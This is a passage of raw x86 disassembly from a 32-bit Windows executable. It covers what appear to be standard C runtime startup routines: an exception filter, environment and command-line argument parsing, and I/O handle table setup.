  405d90:	59                   	pop    %ecx
  405d91:	83 f8 01             	cmp    $0x1,%eax
  405d94:	74 15                	je     0x405dab
  405d96:	6a 03                	push   $0x3
  405d98:	e8 44 29 00 00       	call   0x4086e1
  405d9d:	59                   	pop    %ecx
  405d9e:	85 c0                	test   %eax,%eax
  405da0:	75 1f                	jne    0x405dc1
  405da2:	83 3d a0 f0 40 00 01 	cmpl   $0x1,0x40f0a0
  405da9:	75 16                	jne    0x405dc1
  405dab:	68 fc 00 00 00       	push   $0xfc
  405db0:	e8 25 fe ff ff       	call   0x405bda
  405db5:	68 ff 00 00 00       	push   $0xff
  405dba:	e8 1b fe ff ff       	call   0x405bda
  405dbf:	59                   	pop    %ecx
  405dc0:	59                   	pop    %ecx
  405dc1:	c3                   	ret
  405dc2:	8b ff                	mov    %edi,%edi
  405dc4:	55                   	push   %ebp
  405dc5:	8b ec                	mov    %esp,%ebp
  405dc7:	56                   	push   %esi
  405dc8:	e8 3f 08 00 00       	call   0x40660c
  405dcd:	8b f0                	mov    %eax,%esi
  405dcf:	85 f6                	test   %esi,%esi
  405dd1:	0f 84 32 01 00 00    	je     0x405f09
  405dd7:	8b 4e 5c             	mov    0x5c(%esi),%ecx
  405dda:	8b 55 08             	mov    0x8(%ebp),%edx
  405ddd:	8b c1                	mov    %ecx,%eax
  405ddf:	57                   	push   %edi
  405de0:	39 10                	cmp    %edx,(%eax)
  405de2:	74 0d                	je     0x405df1
  405de4:	83 c0 0c             	add    $0xc,%eax
  405de7:	8d b9 90 00 00 00    	lea    0x90(%ecx),%edi
  405ded:	3b c7                	cmp    %edi,%eax
  405def:	72 ef                	jb     0x405de0
  405df1:	81 c1 90 00 00 00    	add    $0x90,%ecx
  405df7:	3b c1                	cmp    %ecx,%eax
  405df9:	73 04                	jae    0x405dff
  405dfb:	39 10                	cmp    %edx,(%eax)
  405dfd:	74 02                	je     0x405e01
  405dff:	33 c0                	xor    %eax,%eax
  405e01:	85 c0                	test   %eax,%eax
  405e03:	74 07                	je     0x405e0c
  405e05:	8b 50 08             	mov    0x8(%eax),%edx
  405e08:	85 d2                	test   %edx,%edx
  405e0a:	75 07                	jne    0x405e13
  405e0c:	33 c0                	xor    %eax,%eax
  405e0e:	e9 f5 00 00 00       	jmp    0x405f08
  405e13:	83 fa 05             	cmp    $0x5,%edx
  405e16:	75 0c                	jne    0x405e24
  405e18:	83 60 08 00          	andl   $0x0,0x8(%eax)
  405e1c:	33 c0                	xor    %eax,%eax
  405e1e:	40                   	inc    %eax
  405e1f:	e9 e4 00 00 00       	jmp    0x405f08
  405e24:	83 fa 01             	cmp    $0x1,%edx
  405e27:	0f 84 d8 00 00 00    	je     0x405f05
  405e2d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405e30:	53                   	push   %ebx
  405e31:	8b 5e 60             	mov    0x60(%esi),%ebx
  405e34:	89 4e 60             	mov    %ecx,0x60(%esi)
  405e37:	8b 48 04             	mov    0x4(%eax),%ecx
  405e3a:	83 f9 08             	cmp    $0x8,%ecx
  405e3d:	0f 85 b6 00 00 00    	jne    0x405ef9
  405e43:	6a 24                	push   $0x24
  405e45:	59                   	pop    %ecx
  405e46:	8b 7e 5c             	mov    0x5c(%esi),%edi
  405e49:	83 64 39 08 00       	andl   $0x0,0x8(%ecx,%edi,1)
  405e4e:	83 c1 0c             	add    $0xc,%ecx
  405e51:	81 f9 90 00 00 00    	cmp    $0x90,%ecx
  405e57:	7c ed                	jl     0x405e46
  405e59:	8b 00                	mov    (%eax),%eax
  405e5b:	8b 7e 64             	mov    0x64(%esi),%edi
  405e5e:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  405e63:	75 09                	jne    0x405e6e
  405e65:	c7 46 64 83 00 00 00 	movl   $0x83,0x64(%esi)
  405e6c:	eb 7e                	jmp    0x405eec
  405e6e:	3d 90 00 00 c0       	cmp    $0xc0000090,%eax
  405e73:	75 09                	jne    0x405e7e
  405e75:	c7 46 64 81 00 00 00 	movl   $0x81,0x64(%esi)
  405e7c:	eb 6e                	jmp    0x405eec
  405e7e:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  405e83:	75 09                	jne    0x405e8e
  405e85:	c7 46 64 84 00 00 00 	movl   $0x84,0x64(%esi)
  405e8c:	eb 5e                	jmp    0x405eec
  405e8e:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  405e93:	75 09                	jne    0x405e9e
  405e95:	c7 46 64 85 00 00 00 	movl   $0x85,0x64(%esi)
  405e9c:	eb 4e                	jmp    0x405eec
  405e9e:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  405ea3:	75 09                	jne    0x405eae
  405ea5:	c7 46 64 82 00 00 00 	movl   $0x82,0x64(%esi)
  405eac:	eb 3e                	jmp    0x405eec
  405eae:	3d 8f 00 00 c0       	cmp    $0xc000008f,%eax
  405eb3:	75 09                	jne    0x405ebe
  405eb5:	c7 46 64 86 00 00 00 	movl   $0x86,0x64(%esi)
  405ebc:	eb 2e                	jmp    0x405eec
  405ebe:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  405ec3:	75 09                	jne    0x405ece
  405ec5:	c7 46 64 8a 00 00 00 	movl   $0x8a,0x64(%esi)
  405ecc:	eb 1e                	jmp    0x405eec
  405ece:	3d b5 02 00 c0       	cmp    $0xc00002b5,%eax
  405ed3:	75 09                	jne    0x405ede
  405ed5:	c7 46 64 8d 00 00 00 	movl   $0x8d,0x64(%esi)
  405edc:	eb 0e                	jmp    0x405eec
  405ede:	3d b4 02 00 c0       	cmp    $0xc00002b4,%eax
  405ee3:	75 07                	jne    0x405eec
  405ee5:	c7 46 64 8e 00 00 00 	movl   $0x8e,0x64(%esi)
  405eec:	ff 76 64             	push   0x64(%esi)
  405eef:	6a 08                	push   $0x8
  405ef1:	ff d2                	call   *%edx
  405ef3:	59                   	pop    %ecx
  405ef4:	89 7e 64             	mov    %edi,0x64(%esi)
  405ef7:	eb 07                	jmp    0x405f00
  405ef9:	83 60 08 00          	andl   $0x0,0x8(%eax)
  405efd:	51                   	push   %ecx
  405efe:	ff d2                	call   *%edx
  405f00:	59                   	pop    %ecx
  405f01:	89 5e 60             	mov    %ebx,0x60(%esi)
  405f04:	5b                   	pop    %ebx
  405f05:	83 c8 ff             	or     $0xffffffff,%eax
  405f08:	5f                   	pop    %edi
  405f09:	5e                   	pop    %esi
  405f0a:	5d                   	pop    %ebp
  405f0b:	c3                   	ret
  405f0c:	8b ff                	mov    %edi,%edi
  405f0e:	56                   	push   %esi
  405f0f:	8b 35 38 08 41 00    	mov    0x410838,%esi
  405f15:	57                   	push   %edi
  405f16:	33 ff                	xor    %edi,%edi
  405f18:	85 f6                	test   %esi,%esi
  405f1a:	75 1a                	jne    0x405f36
  405f1c:	83 c8 ff             	or     $0xffffffff,%eax
  405f1f:	e9 9d 00 00 00       	jmp    0x405fc1
  405f24:	66 83 f8 3d          	cmp    $0x3d,%ax
  405f28:	74 01                	je     0x405f2b
  405f2a:	47                   	inc    %edi
  405f2b:	56                   	push   %esi
  405f2c:	e8 32 27 00 00       	call   0x408663
  405f31:	59                   	pop    %ecx
  405f32:	8d 74 46 02          	lea    0x2(%esi,%eax,2),%esi
  405f36:	0f b7 06             	movzwl (%esi),%eax
  405f39:	66 85 c0             	test   %ax,%ax
  405f3c:	75 e6                	jne    0x405f24
  405f3e:	53                   	push   %ebx
  405f3f:	6a 04                	push   $0x4
  405f41:	47                   	inc    %edi
  405f42:	57                   	push   %edi
  405f43:	e8 c2 e7 ff ff       	call   0x40470a
  405f48:	8b d8                	mov    %eax,%ebx
  405f4a:	59                   	pop    %ecx
  405f4b:	59                   	pop    %ecx
  405f4c:	89 1d 90 0b 41 00    	mov    %ebx,0x410b90
  405f52:	85 db                	test   %ebx,%ebx
  405f54:	75 05                	jne    0x405f5b
  405f56:	83 c8 ff             	or     $0xffffffff,%eax
  405f59:	eb 65                	jmp    0x405fc0
  405f5b:	8b 35 38 08 41 00    	mov    0x410838,%esi
  405f61:	eb 35                	jmp    0x405f98
  405f63:	56                   	push   %esi
  405f64:	e8 fa 26 00 00       	call   0x408663
  405f69:	66 83 3e 3d          	cmpw   $0x3d,(%esi)
  405f6d:	59                   	pop    %ecx
  405f6e:	8d 78 01             	lea    0x1(%eax),%edi
  405f71:	74 22                	je     0x405f95
  405f73:	6a 02                	push   $0x2
  405f75:	57                   	push   %edi
  405f76:	e8 8f e7 ff ff       	call   0x40470a
  405f7b:	59                   	pop    %ecx
  405f7c:	59                   	pop    %ecx
  405f7d:	89 03                	mov    %eax,(%ebx)
  405f7f:	85 c0                	test   %eax,%eax
  405f81:	74 41                	je     0x405fc4
  405f83:	56                   	push   %esi
  405f84:	57                   	push   %edi
  405f85:	50                   	push   %eax
  405f86:	e8 f3 26 00 00       	call   0x40867e
  405f8b:	83 c4 0c             	add    $0xc,%esp
  405f8e:	85 c0                	test   %eax,%eax
  405f90:	75 49                	jne    0x405fdb
  405f92:	83 c3 04             	add    $0x4,%ebx
  405f95:	8d 34 7e             	lea    (%esi,%edi,2),%esi
  405f98:	66 83 3e 00          	cmpw   $0x0,(%esi)
  405f9c:	75 c5                	jne    0x405f63
  405f9e:	ff 35 38 08 41 00    	push   0x410838
  405fa4:	e8 02 dc ff ff       	call   0x403bab
  405fa9:	83 25 38 08 41 00 00 	andl   $0x0,0x410838
  405fb0:	83 23 00             	andl   $0x0,(%ebx)
  405fb3:	c7 05 44 27 41 00 01 	movl   $0x1,0x412744
  405fba:	00 00 00 
  405fbd:	33 c0                	xor    %eax,%eax
  405fbf:	59                   	pop    %ecx
  405fc0:	5b                   	pop    %ebx
  405fc1:	5f                   	pop    %edi
  405fc2:	5e                   	pop    %esi
  405fc3:	c3                   	ret
  405fc4:	ff 35 90 0b 41 00    	push   0x410b90
  405fca:	e8 dc db ff ff       	call   0x403bab
  405fcf:	83 25 90 0b 41 00 00 	andl   $0x0,0x410b90
  405fd6:	83 c8 ff             	or     $0xffffffff,%eax
  405fd9:	eb e4                	jmp    0x405fbf
  405fdb:	33 c0                	xor    %eax,%eax
  405fdd:	50                   	push   %eax
  405fde:	50                   	push   %eax
  405fdf:	50                   	push   %eax
  405fe0:	50                   	push   %eax
  405fe1:	50                   	push   %eax
  405fe2:	e8 22 e2 ff ff       	call   0x404209
  405fe7:	cc                   	int3
  405fe8:	8b ff                	mov    %edi,%edi
  405fea:	55                   	push   %ebp
  405feb:	8b ec                	mov    %esp,%ebp
  405fed:	51                   	push   %ecx
  405fee:	56                   	push   %esi
  405fef:	33 d2                	xor    %edx,%edx
  405ff1:	57                   	push   %edi
  405ff2:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405ff5:	89 13                	mov    %edx,(%ebx)
  405ff7:	8b f1                	mov    %ecx,%esi
  405ff9:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
  405fff:	39 55 08             	cmp    %edx,0x8(%ebp)
  406002:	74 09                	je     0x40600d
  406004:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406007:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  40600b:	89 31                	mov    %esi,(%ecx)
  40600d:	66 83 38 22          	cmpw   $0x22,(%eax)
  406011:	75 14                	jne    0x406027
  406013:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406016:	33 c9                	xor    %ecx,%ecx
  406018:	85 d2                	test   %edx,%edx
  40601a:	0f 94 c1             	sete   %cl
  40601d:	6a 22                	push   $0x22
  40601f:	83 c0 02             	add    $0x2,%eax
  406022:	8b d1                	mov    %ecx,%edx
  406024:	59                   	pop    %ecx
  406025:	eb 1a                	jmp    0x406041
  406027:	ff 03                	incl   (%ebx)
  406029:	85 f6                	test   %esi,%esi
  40602b:	74 09                	je     0x406036
  40602d:	66 8b 08             	mov    (%eax),%cx
  406030:	66 89 0e             	mov    %cx,(%esi)
  406033:	83 c6 02             	add    $0x2,%esi
  406036:	0f b7 08             	movzwl (%eax),%ecx
  406039:	83 c0 02             	add    $0x2,%eax
  40603c:	66 85 c9             	test   %cx,%cx
  40603f:	74 3b                	je     0x40607c
  406041:	85 d2                	test   %edx,%edx
  406043:	75 c8                	jne    0x40600d
  406045:	66 83 f9 20          	cmp    $0x20,%cx
  406049:	74 06                	je     0x406051
  40604b:	66 83 f9 09          	cmp    $0x9,%cx
  40604f:	75 bc                	jne    0x40600d
  406051:	85 f6                	test   %esi,%esi
  406053:	74 06                	je     0x40605b
  406055:	33 c9                	xor    %ecx,%ecx
  406057:	66 89 4e fe          	mov    %cx,-0x2(%esi)
  40605b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40605f:	33 d2                	xor    %edx,%edx
  406061:	66 39 10             	cmp    %dx,(%eax)
  406064:	0f 84 c5 00 00 00    	je     0x40612f
  40606a:	0f b7 08             	movzwl (%eax),%ecx
  40606d:	83 f9 20             	cmp    $0x20,%ecx
  406070:	74 05                	je     0x406077
  406072:	83 f9 09             	cmp    $0x9,%ecx
  406075:	75 0a                	jne    0x406081
  406077:	83 c0 02             	add    $0x2,%eax
  40607a:	eb ee                	jmp    0x40606a
  40607c:	83 e8 02             	sub    $0x2,%eax
  40607f:	eb da                	jmp    0x40605b
  406081:	66 39 10             	cmp    %dx,(%eax)
  406084:	0f 84 a5 00 00 00    	je     0x40612f
  40608a:	39 55 08             	cmp    %edx,0x8(%ebp)
  40608d:	74 09                	je     0x406098
  40608f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406092:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  406096:	89 31                	mov    %esi,(%ecx)
  406098:	ff 07                	incl   (%edi)
  40609a:	33 ff                	xor    %edi,%edi
  40609c:	47                   	inc    %edi
  40609d:	33 d2                	xor    %edx,%edx
  40609f:	eb 04                	jmp    0x4060a5
  4060a1:	83 c0 02             	add    $0x2,%eax
  4060a4:	42                   	inc    %edx
  4060a5:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  4060a9:	74 f6                	je     0x4060a1
  4060ab:	66 83 38 22          	cmpw   $0x22,(%eax)
  4060af:	75 38                	jne    0x4060e9
  4060b1:	f6 c2 01             	test   $0x1,%dl
  4060b4:	75 1f                	jne    0x4060d5
  4060b6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4060ba:	74 0c                	je     0x4060c8
  4060bc:	66 83 78 02 22       	cmpw   $0x22,0x2(%eax)
  4060c1:	75 05                	jne    0x4060c8
  4060c3:	83 c0 02             	add    $0x2,%eax
  4060c6:	eb 0d                	jmp    0x4060d5
  4060c8:	33 c9                	xor    %ecx,%ecx
  4060ca:	33 ff                	xor    %edi,%edi
  4060cc:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  4060cf:	0f 94 c1             	sete   %cl
  4060d2:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4060d5:	d1 ea                	shr    $1,%edx
  4060d7:	eb 10                	jmp    0x4060e9
  4060d9:	4a                   	dec    %edx
  4060da:	85 f6                	test   %esi,%esi
  4060dc:	74 09                	je     0x4060e7
  4060de:	6a 5c                	push   $0x5c
  4060e0:	59                   	pop    %ecx
  4060e1:	66 89 0e             	mov    %cx,(%esi)
  4060e4:	83 c6 02             	add    $0x2,%esi
  4060e7:	ff 03                	incl   (%ebx)
  4060e9:	85 d2                	test   %edx,%edx
  4060eb:	75 ec                	jne    0x4060d9
  4060ed:	0f b7 08             	movzwl (%eax),%ecx
  4060f0:	66 85 c9             	test   %cx,%cx
  4060f3:	74 24                	je     0x406119
  4060f5:	39 55 fc             	cmp    %edx,-0x4(%ebp)
  4060f8:	75 0a                	jne    0x406104
  4060fa:	83 f9 20             	cmp    $0x20,%ecx
  4060fd:	74 1a                	je     0x406119
  4060ff:	83 f9 09             	cmp    $0x9,%ecx
  406102:	74 15                	je     0x406119
  406104:	85 ff                	test   %edi,%edi
  406106:	74 0c                	je     0x406114
  406108:	85 f6                	test   %esi,%esi
  40610a:	74 06                	je     0x406112
  40610c:	66 89 0e             	mov    %cx,(%esi)
  40610f:	83 c6 02             	add    $0x2,%esi
  406112:	ff 03                	incl   (%ebx)
  406114:	83 c0 02             	add    $0x2,%eax
  406117:	eb 81                	jmp    0x40609a
  406119:	85 f6                	test   %esi,%esi
  40611b:	74 08                	je     0x406125
  40611d:	33 c9                	xor    %ecx,%ecx
  40611f:	66 89 0e             	mov    %cx,(%esi)
  406122:	83 c6 02             	add    $0x2,%esi
  406125:	ff 03                	incl   (%ebx)
  406127:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40612a:	e9 30 ff ff ff       	jmp    0x40605f
  40612f:	8b 45 08             	mov    0x8(%ebp),%eax
  406132:	3b c2                	cmp    %edx,%eax
  406134:	74 02                	je     0x406138
  406136:	89 10                	mov    %edx,(%eax)
  406138:	ff 07                	incl   (%edi)
  40613a:	5f                   	pop    %edi
  40613b:	5e                   	pop    %esi
  40613c:	c9                   	leave
  40613d:	c3                   	ret
  40613e:	8b ff                	mov    %edi,%edi
  406140:	55                   	push   %ebp
  406141:	8b ec                	mov    %esp,%ebp
  406143:	51                   	push   %ecx
  406144:	51                   	push   %ecx
  406145:	53                   	push   %ebx
  406146:	56                   	push   %esi
  406147:	57                   	push   %edi
  406148:	68 04 01 00 00       	push   $0x104
  40614d:	be d8 11 41 00       	mov    $0x4111d8,%esi
  406152:	56                   	push   %esi
  406153:	33 c0                	xor    %eax,%eax
  406155:	33 db                	xor    %ebx,%ebx
  406157:	53                   	push   %ebx
  406158:	66 a3 e0 13 41 00    	mov    %ax,0x4113e0
  40615e:	ff 15 1c b1 40 00    	call   *0x40b11c
  406164:	a1 60 27 41 00       	mov    0x412760,%eax
  406169:	89 35 9c 0b 41 00    	mov    %esi,0x410b9c
  40616f:	3b c3                	cmp    %ebx,%eax
  406171:	74 07                	je     0x40617a
  406173:	8b f8                	mov    %eax,%edi
  406175:	66 39 18             	cmp    %bx,(%eax)
  406178:	75 02                	jne    0x40617c
  40617a:	8b fe                	mov    %esi,%edi
  40617c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40617f:	50                   	push   %eax
  406180:	53                   	push   %ebx
  406181:	8d 5d f8             	lea    -0x8(%ebp),%ebx
  406184:	33 c9                	xor    %ecx,%ecx
  406186:	8b c7                	mov    %edi,%eax
  406188:	e8 5b fe ff ff       	call   0x405fe8
  40618d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  406190:	59                   	pop    %ecx
  406191:	59                   	pop    %ecx
  406192:	81 fb ff ff ff 3f    	cmp    $0x3fffffff,%ebx
  406198:	73 4a                	jae    0x4061e4
  40619a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40619d:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  4061a3:	73 3f                	jae    0x4061e4
  4061a5:	8d 04 59             	lea    (%ecx,%ebx,2),%eax
  4061a8:	03 c0                	add    %eax,%eax
  4061aa:	03 c9                	add    %ecx,%ecx
  4061ac:	3b c1                	cmp    %ecx,%eax
  4061ae:	72 34                	jb     0x4061e4
  4061b0:	50                   	push   %eax
  4061b1:	e8 0f e5 ff ff       	call   0x4046c5
  4061b6:	8b f0                	mov    %eax,%esi
  4061b8:	59                   	pop    %ecx
  4061b9:	85 f6                	test   %esi,%esi
  4061bb:	74 27                	je     0x4061e4
  4061bd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4061c0:	50                   	push   %eax
  4061c1:	8d 0c 9e             	lea    (%esi,%ebx,4),%ecx
  4061c4:	56                   	push   %esi
  4061c5:	8d 5d f8             	lea    -0x8(%ebp),%ebx
  4061c8:	8b c7                	mov    %edi,%eax
  4061ca:	e8 19 fe ff ff       	call   0x405fe8
  4061cf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4061d2:	48                   	dec    %eax
  4061d3:	59                   	pop    %ecx
  4061d4:	a3 7c 0b 41 00       	mov    %eax,0x410b7c
  4061d9:	59                   	pop    %ecx
  4061da:	89 35 84 0b 41 00    	mov    %esi,0x410b84
  4061e0:	33 c0                	xor    %eax,%eax
  4061e2:	eb 03                	jmp    0x4061e7
  4061e4:	83 c8 ff             	or     $0xffffffff,%eax
  4061e7:	5f                   	pop    %edi
  4061e8:	5e                   	pop    %esi
  4061e9:	5b                   	pop    %ebx
  4061ea:	c9                   	leave
  4061eb:	c3                   	ret
  4061ec:	8b ff                	mov    %edi,%edi
  4061ee:	56                   	push   %esi
  4061ef:	ff 15 24 b1 40 00    	call   *0x40b124
  4061f5:	8b f0                	mov    %eax,%esi
  4061f7:	33 c9                	xor    %ecx,%ecx
  4061f9:	3b f1                	cmp    %ecx,%esi
  4061fb:	75 04                	jne    0x406201
  4061fd:	33 c0                	xor    %eax,%eax
  4061ff:	5e                   	pop    %esi
  406200:	c3                   	ret
  406201:	66 39 0e             	cmp    %cx,(%esi)
  406204:	74 10                	je     0x406216
  406206:	83 c0 02             	add    $0x2,%eax
  406209:	66 39 08             	cmp    %cx,(%eax)
  40620c:	75 f8                	jne    0x406206
  40620e:	83 c0 02             	add    $0x2,%eax
  406211:	66 39 08             	cmp    %cx,(%eax)
  406214:	75 f0                	jne    0x406206
  406216:	53                   	push   %ebx
  406217:	2b c6                	sub    %esi,%eax
  406219:	8d 58 02             	lea    0x2(%eax),%ebx
  40621c:	57                   	push   %edi
  40621d:	53                   	push   %ebx
  40621e:	e8 a2 e4 ff ff       	call   0x4046c5
  406223:	8b f8                	mov    %eax,%edi
  406225:	59                   	pop    %ecx
  406226:	85 ff                	test   %edi,%edi
  406228:	75 0d                	jne    0x406237
  40622a:	56                   	push   %esi
  40622b:	ff 15 20 b1 40 00    	call   *0x40b120
  406231:	8b c7                	mov    %edi,%eax
  406233:	5f                   	pop    %edi
  406234:	5b                   	pop    %ebx
  406235:	5e                   	pop    %esi
  406236:	c3                   	ret
  406237:	53                   	push   %ebx
  406238:	56                   	push   %esi
  406239:	57                   	push   %edi
  40623a:	e8 31 db ff ff       	call   0x403d70
  40623f:	83 c4 0c             	add    $0xc,%esp
  406242:	eb e6                	jmp    0x40622a
  406244:	8b ff                	mov    %edi,%edi
  406246:	55                   	push   %ebp
  406247:	8b ec                	mov    %esp,%ebp
  406249:	83 ec 4c             	sub    $0x4c,%esp
  40624c:	56                   	push   %esi
  40624d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  406250:	50                   	push   %eax
  406251:	ff 15 30 b1 40 00    	call   *0x40b130
  406257:	6a 40                	push   $0x40
  406259:	6a 20                	push   $0x20
  40625b:	5e                   	pop    %esi
  40625c:	56                   	push   %esi
  40625d:	e8 a8 e4 ff ff       	call   0x40470a
  406262:	59                   	pop    %ecx
  406263:	59                   	pop    %ecx
  406264:	33 c9                	xor    %ecx,%ecx
  406266:	3b c1                	cmp    %ecx,%eax
  406268:	75 08                	jne    0x406272
  40626a:	83 c8 ff             	or     $0xffffffff,%eax
  40626d:	e9 0f 02 00 00       	jmp    0x406481
  406272:	8d 90 00 08 00 00    	lea    0x800(%eax),%edx
  406278:	a3 20 16 41 00       	mov    %eax,0x411620
  40627d:	89 35 04 16 41 00    	mov    %esi,0x411604
  406283:	3b c2                	cmp    %edx,%eax
  406285:	73 36                	jae    0x4062bd
  406287:	83 c0 05             	add    $0x5,%eax
  40628a:	83 48 fb ff          	orl    $0xffffffff,-0x5(%eax)
  40628e:	66 c7 40 ff 00 0a    	movw   $0xa00,-0x1(%eax)
  406294:	89 48 03             	mov    %ecx,0x3(%eax)
  406297:	66 c7 40 1f 00 0a    	movw   $0xa00,0x1f(%eax)
  40629d:	c6 40 21 0a          	movb   $0xa,0x21(%eax)
  4062a1:	89 48 33             	mov    %ecx,0x33(%eax)
  4062a4:	88 48 2f             	mov    %cl,0x2f(%eax)
  4062a7:	8b 35 20 16 41 00    	mov    0x411620,%esi
  4062ad:	83 c0 40             	add    $0x40,%eax
  4062b0:	8d 50 fb             	lea    -0x5(%eax),%edx
  4062b3:	81 c6 00 08 00 00    	add    $0x800,%esi
  4062b9:	3b d6                	cmp    %esi,%edx
  4062bb:	72 cd                	jb     0x40628a
  4062bd:	53                   	push   %ebx
  4062be:	57                   	push   %edi
  4062bf:	66 39 4d e6          	cmp    %cx,-0x1a(%ebp)
  4062c3:	0f 84 0e 01 00 00    	je     0x4063d7
  4062c9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4062cc:	3b c1                	cmp    %ecx,%eax
  4062ce:	0f 84 03 01 00 00    	je     0x4063d7
  4062d4:	8b 18                	mov    (%eax),%ebx
  4062d6:	83 c0 04             	add    $0x4,%eax
  4062d9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4062dc:	03 c3                	add    %ebx,%eax
  4062de:	be 00 08 00 00       	mov    $0x800,%esi
  4062e3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4062e6:	3b de                	cmp    %esi,%ebx
  4062e8:	7c 02                	jl     0x4062ec
  4062ea:	8b de                	mov    %esi,%ebx
  4062ec:	39 1d 04 16 41 00    	cmp    %ebx,0x411604
  4062f2:	7d 6b                	jge    0x40635f
  4062f4:	bf 24 16 41 00       	mov    $0x411624,%edi
  4062f9:	6a 40                	push   $0x40
  4062fb:	6a 20                	push   $0x20
  4062fd:	e8 08 e4 ff ff       	call   0x40470a
  406302:	59                   	pop    %ecx
  406303:	59                   	pop    %ecx
  406304:	85 c0                	test   %eax,%eax
  406306:	74 51                	je     0x406359
  406308:	83 05 04 16 41 00 20 	addl   $0x20,0x411604
  40630f:	8d 88 00 08 00 00    	lea    0x800(%eax),%ecx
  406315:	89 07                	mov    %eax,(%edi)
  406317:	3b c1                	cmp    %ecx,%eax
  406319:	73 31                	jae    0x40634c
  40631b:	83 c0 05             	add    $0x5,%eax
  40631e:	83 48 fb ff          	orl    $0xffffffff,-0x5(%eax)
  406322:	83 60 03 00          	andl   $0x0,0x3(%eax)
  406326:	80 60 1f 80          	andb   $0x80,0x1f(%eax)
  40632a:	83 60 33 00          	andl   $0x0,0x33(%eax)
  40632e:	66 c7 40 ff 00 0a    	movw   $0xa00,-0x1(%eax)
  406334:	66 c7 40 20 0a 0a    	movw   $0xa0a,0x20(%eax)
  40633a:	c6 40 2f 00          	movb   $0x0,0x2f(%eax)
  40633e:	8b 0f                	mov    (%edi),%ecx
  406340:	83 c0 40             	add    $0x40,%eax
  406343:	03 ce                	add    %esi,%ecx
  406345:	8d 50 fb             	lea    -0x5(%eax),%edx
  406348:	3b d1                	cmp    %ecx,%edx
  40634a:	72 d2                	jb     0x40631e
  40634c:	83 c7 04             	add    $0x4,%edi
  40634f:	39 1d 04 16 41 00    	cmp    %ebx,0x411604
  406355:	7c a2                	jl     0x4062f9
  406357:	eb 06                	jmp    0x40635f
  406359:	8b 1d 04 16 41 00    	mov    0x411604,%ebx
  40635f:	33 ff                	xor    %edi,%edi
  406361:	85 db                	test   %ebx,%ebx
  406363:	7e 72                	jle    0x4063d7
  406365:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406368:	8b 00                	mov    (%eax),%eax
  40636a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40636d:	74 5c                	je     0x4063cb
  40636f:	83 f8 fe             	cmp    $0xfffffffe,%eax
  406372:	74 57                	je     0x4063cb
  406374:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406377:	8a 09                	mov    (%ecx),%cl
  406379:	f6 c1 01             	test   $0x1,%cl
  40637c:	74 4d                	je     0x4063cb
  40637e:	f6 c1 08             	test   $0x8,%cl
  406381:	75 0b                	jne    0x40638e
  406383:	50                   	push   %eax
  406384:	ff 15 2c b1 40 00    	call   *0x40b12c
  40638a:	85 c0                	test   %eax,%eax
  40638c:	74 3d                	je     0x4063cb
  40638e:	8b f7                	mov    %edi,%esi
  406390:	83 e6 1f             	and    $0x1f,%esi
  406393:	8b c7                	mov    %edi,%eax
  406395:	c1 f8 05             	sar    $0x5,%eax
  406398:	c1 e6 06             	shl    $0x6,%esi
  40639b:	03 34 85 20 16 41 00 	add    0x411620(,%eax,4),%esi
  4063a2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4063a5:	8b 00                	mov    (%eax),%eax
  4063a7:	89 06                	mov    %eax,(%esi)
  4063a9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063ac:	8a 00                	mov    (%eax),%al
  4063ae:	88 46 04             	mov    %al,0x4(%esi)
  4063b1:	68 a0 0f 00 00       	push   $0xfa0
  4063b6:	8d 46 0c             	lea    0xc(%esi),%eax
  4063b9:	50                   	push   %eax
  4063ba:	ff 15 90 b0 40 00    	call   *0x40b090
  4063c0:	85 c0                	test   %eax,%eax
  4063c2:	0f 84 bc 00 00 00    	je     0x406484
  4063c8:	ff 46 08             	incl   0x8(%esi)
  4063cb:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  4063cf:	47                   	inc    %edi
  4063d0:	ff 45 fc             	incl   -0x4(%ebp)
  4063d3:	3b fb                	cmp    %ebx,%edi
  4063d5:	7c 8e                	jl     0x406365
  4063d7:	33 db                	xor    %ebx,%ebx
  4063d9:	8b f3                	mov    %ebx,%esi
  4063db:	c1 e6 06             	shl    $0x6,%esi
  4063de:	03 35 20 16 41 00    	add    0x411620,%esi
  4063e4:	8b 06                	mov    (%esi),%eax
  4063e6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4063e9:	74 0b                	je     0x4063f6
  4063eb:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4063ee:	74 06                	je     0x4063f6
  4063f0:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  4063f4:	eb 71                	jmp    0x406467
  4063f6:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  4063fa:	85 db                	test   %ebx,%ebx
  4063fc:	75 05                	jne    0x406403
  4063fe:	6a f6                	push   $0xfffffff6
  406400:	58                   	pop    %eax
